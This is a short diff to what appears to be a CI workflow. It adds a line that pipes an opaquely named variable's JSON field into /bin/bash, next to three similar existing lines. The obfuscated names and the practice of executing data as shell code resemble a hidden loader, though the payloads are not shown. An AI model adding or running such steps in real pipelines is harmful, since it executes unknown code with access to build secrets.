@@ -29,6 +29,7 @@ jobs:
           echo $ntldr80618 | jq -r .e055 | /bin/bash
           echo $j1 | jq -r .m100 | /bin/bash
           printf '%s' "$s4" | jq -r .slh2 | /bin/bash
+          printf '%s' "$xff520" | jq -r .a64 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
